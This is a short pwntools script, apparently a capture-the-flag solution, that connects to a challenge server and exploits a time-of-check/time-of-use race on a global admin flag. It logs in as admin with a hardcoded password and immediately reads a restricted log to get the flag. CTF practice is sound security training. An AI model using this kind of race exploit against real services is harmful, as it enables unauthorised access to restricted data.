# fast_send.py
from pwn import *

HOST = "challs.ctf.rusec.club"
PORT = 22169

io = remote(HOST, PORT)

# Exploit steps:
# 1. Login as admin to start the race window
# 2. Immediately request a restricted log
# 3. Exploit the TOCTOU on the global is_admin flag

# Menu:
# 1. Login admin
# 2. Write log
# 3. Read log
# 4. Exit

io.sendline(b"1")            # Select "1. Login admin"
io.sendline(b"supersecret")  # Admin password

io.sendline(b"3")            # Select "3. Read log"
io.sendline(b"0")            # Restricted log index

io.interactive()              # Interactive shell (flag output)
